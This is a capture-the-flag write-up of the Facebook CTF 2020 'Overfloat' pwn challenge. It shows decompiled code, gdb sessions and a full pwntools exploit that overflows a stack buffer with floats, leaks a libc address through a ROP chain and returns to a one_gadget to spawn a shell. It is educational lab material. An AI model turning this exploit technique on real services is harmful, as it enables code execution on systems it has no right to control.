# Overfloat - Facebook CTF 2020 Writeup
Category: Pwn

Attached file [overfloat.tar.gz](overfloat.tar.gz)

## Overfloat Solution

```console
┌─[evyatar@parrot]─[/facebook_ctf/pwn/overfloat]
└──╼ $ checksec overfloat
[*] '/facebook_ctf/pwn/overfloat/overfloat'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We can see 64bit file, [Partial RELRO](https://ctf101.org/binary-exploitation/relocation-read-only/), [No Canary](https://ctf101.org/binary-exploitation/stack-canaries/), [NX enabled](https://ctf101.org/binary-exploitation/no-execute/) and [No PIE](https://en.wikipedia.org/wiki/Position-independent_code).

Running the binary we can see that it prompts us for latitude / longtitude pairs:
```console
┌─[evyatar@parrot]─[/facebook_ctf/pwn/overfloat]
└──╼ $ ./overfloat
                                 _ .--.        
                                ( `    )       
                             .-'      `--,     
                  _..----.. (             )`-. 
                .'_|` _|` _|(  .__,           )
               /_|  _|  _|  _(        (_,  .-' 
              ;|  _|  _|  _|  '-'__,--'`--'    
              | _|  _|  _|  _| |               
          _   ||  _|  _|  _|  _|               
        _( `--.\_|  _|  _|  _|/               
     .-'       )--,|  _|  _|.`                 
    (__, (_      ) )_|  _| /                   
      `-.__.\ _,--'\|__|__/                  
                    ;____;                     
                     \YT/                     
                      ||                       
                     |""|                    
                     '=='                      

WHERE WOULD YOU LIKE TO GO?
LAT[0]: 11
LON[0]: 22

```

Let's observe the ```main``` function using Ghidra:
```C

undefined8 main(void)

{
  undefined local_38 [48];
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  alarm(0x1e);
  __sysv_signal(0xe,timeout);
  puts(
      "                                 _ .--.        \n                                ( `    )      \n                             .-\'      `--,     \n                  _..----.. (            )`-. \n                .\'_|` _|` _|(  .__,           )\n               /_|  _|  _|  _(       (_,  .-\' \n              ;|  _|  _|  _|  \'-\'__,--\'`--\'    \n              | _|  _| _|  _| |               \n          _   ||  _|  _|  _|  _|               \n        _( `--.\\_| _|  _|  _|/               \n     .-\'       )--,|  _|  _|.`                 \n    (__, (_     ) )_|  _| /                   \n      `-.__.\\ _,--\'\\|__|__/                  \n                   ;____;                     \n                     \\YT/                     \n                     ||                       \n                     |\"\"|                    \n                    \'==\'                      \n\nWHERE WOULD YOU LIKE TO GO?"
      );
  memset(local_38,0,0x28);
  chart_course((long)local_38);
  puts("BON VOYAGE!");
  return 0;
}
```

We can see that the part we are really interested about is ```chart_course``` function call, Which takes the pointer ```local_38``` as an argument.

Let's observe on ```chart_course``` function:
```C
void chart_course(long param_1)
{
  int iVar1;
  uint uVar2;
  double dVar3;
  char local_78 [104];
  float local_10;
  uint local_c;
  
  local_c = 0;
  do {
    if ((local_c & 1) == 0) {
      iVar1 = (int)local_c / 2;
      uVar2 = iVar1 + ((iVar1 / 10 + ((int)(local_c - ((int)local_c >> 0x1f)) >> 0x1f)) -
                      (iVar1 >> 0x1f)) * -10;
      printf("LAT[%d]: ",(ulong)uVar2,(ulong)uVar2);
    }
    else {
      iVar1 = (int)local_c / 2;
      uVar2 = iVar1 + ((iVar1 / 10 + ((int)(local_c - ((int)local_c >> 0x1f)) >> 0x1f)) -
                      (iVar1 >> 0x1f)) * -10;
      printf("LON[%d]: ",(ulong)uVar2,(ulong)uVar2,(ulong)uVar2);
    }
    fgets(local_78,100,stdin);
    iVar1 = strncmp(local_78,"done",4);
    if (iVar1 == 0) {
      if ((local_c & 1) == 0) {
        return;
      }
      puts("WHERES THE LONGITUDE?");
      local_c = local_c - 1;
    }
    else {
      dVar3 = atof(local_78);
      local_10 = (float)dVar3;
      memset(local_78,0,100);
      *(float *)(param_1 + (long)(int)local_c * 4) = local_10;
    }
    local_c = local_c + 1;
  } while( true );
}
```

As we can see that it essentially scans in data as four byte floats into the char ptr (which is ```local_38``` ) that is passed to the function as an argument and finish the ```while``` loop when we insert ```done``` as input.

It does this by scanning in 100 bytes of data into input, Then converting it to a ```float```, stored in float, and then setting ```local_38 + (long)(int)local_c * 4``` equal to float (where ```local_c``` is equal to the amount of floats scanned in already).

There is no checking if it overflows the buffer and like that - we have a buffer overflow.

The buffer that we are overflowing ```local_38``` is from the stack in main, We need to return from the main function before getting code exeuction.


Let's calculate the offset between ```local_38``` buffer to ```rip``` on main (It's should be 8 bytes because ```local_38``` is the only thing on the stack on ```main```):

```asm
┌─[evyatar@parrot]─[/facebook_ctf/pwn/overfloat]
└──╼ $ gdb overfloat
gef➤  disassemble main
Dump of assembler code for function main:
   0x0000000000400993 <+0>:	push   rbp
   0x0000000000400994 <+1>:	mov    rbp,rsp
   0x0000000000400997 <+4>:	sub    rsp,0x40
   0x000000000040099b <+8>:	mov    DWORD PTR [rbp-0x34],edi
   0x000000000040099e <+11>:	mov    QWORD PTR [rbp-0x40],rsi
   0x00000000004009a2 <+15>:	mov    rax,QWORD PTR [rip+0x2016d7]        # 0x602080 <stdout@@GLIBC_2.2.5>
   0x00000000004009a9 <+22>:	mov    esi,0x0
   0x00000000004009ae <+27>:	mov    rdi,rax
   0x00000000004009b1 <+30>:	call   0x4006b0 <setbuf@plt>
   0x00000000004009b6 <+35>:	mov    rax,QWORD PTR [rip+0x2016d3]        # 0x602090 <stdin@@GLIBC_2.2.5>
   0x00000000004009bd <+42>:	mov    esi,0x0
   0x00000000004009c2 <+47>:	mov    rdi,rax
   0x00000000004009c5 <+50>:	call   0x4006b0 <setbuf@plt>
   0x00000000004009ca <+55>:	mov    edi,0x1e
   0x00000000004009cf <+60>:	call   0x4006e0 <alarm@plt>
   0x00000000004009d4 <+65>:	mov    esi,0x400836
   0x00000000004009d9 <+70>:	mov    edi,0xe
   0x00000000004009de <+75>:	call   0x400710 <__sysv_signal@plt>
   0x00000000004009e3 <+80>:	mov    edi,0x400af0
   0x00000000004009e8 <+85>:	call   0x400690 <puts@plt>
   0x00000000004009ed <+90>:	lea    rax,[rbp-0x30]
   0x00000000004009f1 <+94>:	mov    edx,0x28
   0x00000000004009f6 <+99>:	mov    esi,0x0
   0x00000000004009fb <+104>:	mov    rdi,rax
   0x00000000004009fe <+107>:	call   0x4006d0 <memset@plt>
   0x0000000000400a03 <+112>:	lea    rax,[rbp-0x30]
   0x0000000000400a07 <+116>:	mov    rdi,rax
   0x0000000000400a0a <+119>:	call   0x400855 <chart_course>
   0x0000000000400a0f <+124>:	mov    edi,0x400e67
   0x0000000000400a14 <+129>:	call   0x400690 <puts@plt>
   0x0000000000400a19 <+134>:	mov    eax,0x0
   0x0000000000400a1e <+139>:	leave  
   0x0000000000400a1f <+140>:	ret    
End of assembler dump.
gef➤  b *main+119

```

Run it:
```asm
gef➤ r
                                 _ .--.        
                                ( `    )       
                             .-'      `--,     
                  _..----.. (             )`-. 
                .'_|` _|` _|(  .__,           )
               /_|  _|  _|  _(        (_,  .-' 
              ;|  _|  _|  _|  '-'__,--'`--'    
              | _|  _|  _|  _| |               
          _   ||  _|  _|  _|  _|               
        _( `--.\_|  _|  _|  _|/               
     .-'       )--,|  _|  _|.`                 
    (__, (_      ) )_|  _| /                   
      `-.__.\ _,--'\|__|__/                  
                    ;____;                     
                     \YT/                     
                      ||                       
                     |""|                    
                     '=='                      

WHERE WOULD YOU LIKE TO GO?
...

Breakpoint 1, 0x0000000000400a0a in main ()
gef➤  i f
Stack level 0, frame at 0x7fffffffdf00:
 rip = 0x400a0a in main; saved rip = 0x7ffff7a03bf7
 Arglist at 0x7fffffffdef0, args: 
 Locals at 0x7fffffffdef0, Previous frame's sp is 0x7fffffffdf00
 Saved registers:
  rbp at 0x7fffffffdef0, rip at 0x7fffffffdef8
```

```rip``` located on ```0x7fffffffdef8```, and ```local_38``` located on:
```asm
gef➤  print $rbp-0x30
$1 = (void *) 0x7fffffffdec0
```

And the offset is: ```0x7fffffffdef8 - 0x7fffffffdec0 = 0x38``` which is 56 bytes so:
```
...| local_38 [48] | 8 bytes | rip | ...
```

Now, We need to find a leak from libc, We can do it using ```puts``` (since puts is an imported function and called from ```main```, we can call it) with the got address of puts to give us a libc infoleak.

So first, let's get the address of ```puts``` from ```got```:
```asm
gef➤  got

GOT protection: Partial RelRO | GOT functions: 11
 
[0x602018] strncmp@GLIBC_2.2.5  →  0x7ffff7b67450
[0x602020] puts@GLIBC_2.2.5  →  0x7ffff7a62aa0
[0x602028] atof@GLIBC_2.2.5  →  0x7ffff7a22790
[0x602030] setbuf@GLIBC_2.2.5  →  0x7ffff7a6a5a0
[0x602038] printf@GLIBC_2.2.5  →  0x7ffff7a46f70
[0x602040] memset@GLIBC_2.2.5  →  0x7ffff7b70e30
[0x602048] alarm@GLIBC_2.2.5  →  0x7ffff7ac6610
[0x602050] __libc_start_main@GLIBC_2.2.5  →  0x7ffff7a03b10
[0x602058] fgets@GLIBC_2.2.5  →  0x7ffff7a60c00
[0x602060] __sysv_signal@GLIBC_2.2.5  →  0x7ffff7a21b80
[0x602068] exit@GLIBC_2.2.5  →  0x400726
```

We can see ```puts``` located on ```0x602020``` on ```got```, And  located on ```0x400690``` on plt:
```asm
gef➤  disassemble main
...
0x0000000000400a14 <+129>:	call   0x400690 <puts@plt>
```

So let's get the ```puts``` leak first:
```python
from pwn import *

pf = lambda x: struct.pack('f', x)
uf = lambda x: struct.unpack('f', x)[0]

target = process('./overfloat')
libc = ELF('libc-2.27.so')

putsGot = 0x602020
putsPlt = 0x400690
main = 0x400993
popRdi = 0x400a83

def sendVal(x):
    v1 = x & ((2**32) - 1)
    v2 = x >> 32
    target.sendline(str(uf(p32(v1))))
    target.sendline(str(uf(p32(v2))))

with log.progress("Step 1: Fill the space between buffer to return address"):
    for i in range(7): # 56 / 8 = 7 iterations
        sendVal(0xdeadbeefdeadbeef)

with log.progress("Step 2: leak puts libc address"):
    sendVal(popRdi)
    sendVal(putsGot)
    sendVal(putsPlt)
    sendVal(main)

    # Send done so our code executes
    target.sendline('done')


    # Print out the target output
    print(target.recvuntil('BON VOYAGE!\n').decode('utf8'))

    
    # Scan in, filter out the libc infoleak, calculate the base
    leak = target.recv(6)
    leak = u64(leak + "\x00"*(8-len(leak)))
    libc.address = leak - libc.symbols['puts']
    log.info("libc base: " + hex(libc.address))
```

Now, Let's find ```one_gadget``` to call ```system```:
```console
┌─[evyatar@parrot]─[/facebook_ctf/pwn/overfloat]
└──╼ $ one_gadget libc-2.27.so 
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```

Now, Let's fill again the buffer and get a shell using the first address from ```one_gadget```:
```python
with log.progress("Step 3: Fill the space between buffer to return address"):
    for i in range(7): # 56 / 8 = 7 iterations
        sendVal(0xdeadbeefdeadbeef)

with log.progress("Step 4: use onegadget to get shell"):
	one_gadget = 0x4f2c5 # one_gadget libc-2.27.so
	one_gadget_address = libc.address + one_gadget
	sendVal(one_gadget_address)
	
	target.sendline('done')
	target.interactive()

```

Write all together [exp.py](exp.py):
```python
from pwn import *

pf = lambda x: struct.pack('f', x)
uf = lambda x: struct.unpack('f', x)[0]

target = process('./overfloat')
libc = ELF('libc-2.27.so')

putsGot = 0x602020
putsPlt = 0x400690
main = 0x400993
popRdi = 0x400a83

def sendVal(x):
    v1 = x & ((2**32) - 1)
    v2 = x >> 32
    target.sendline(str(uf(p32(v1))))
    target.sendline(str(uf(p32(v2))))

with log.progress("Step 1: Fill the space between buffer to return address"):
    for i in range(7): # 56 / 8 = 7 iterations
        sendVal(0xdeadbeefdeadbeef)

with log.progress("Step 2: leak puts libc address"):
    sendVal(popRdi)
    sendVal(putsGot)
    sendVal(putsPlt)
    sendVal(main)

    # Send done so our code executes
    target.sendline('done')


    # Print out the target output
    print(target.recvuntil('BON VOYAGE!\n').decode('utf8'))

    
    # Scan in, filter out the libc infoleak, calculate the base
    leak = target.recv(6)
    leak = u64(leak + "\x00"*(8-len(leak)))
    libc.address = leak - libc.symbols['puts']
    log.info("libc base: " + hex(libc.address))

with log.progress("Step 3: Fill the space between buffer to return address"):
    for i in range(7): # 56 / 8 = 7 iterations
        sendVal(0xdeadbeefdeadbeef)

with log.progress("Step 4: use onegadget to get shell"):
	one_gadget = 0x4f2c5 # one_gadget libc-2.27.so
	one_gadget_address = libc.address + one_gadget
	sendVal(one_gadget_address)
	
	target.sendline('done')
	target.interactive()
```

And just run it to get the flag.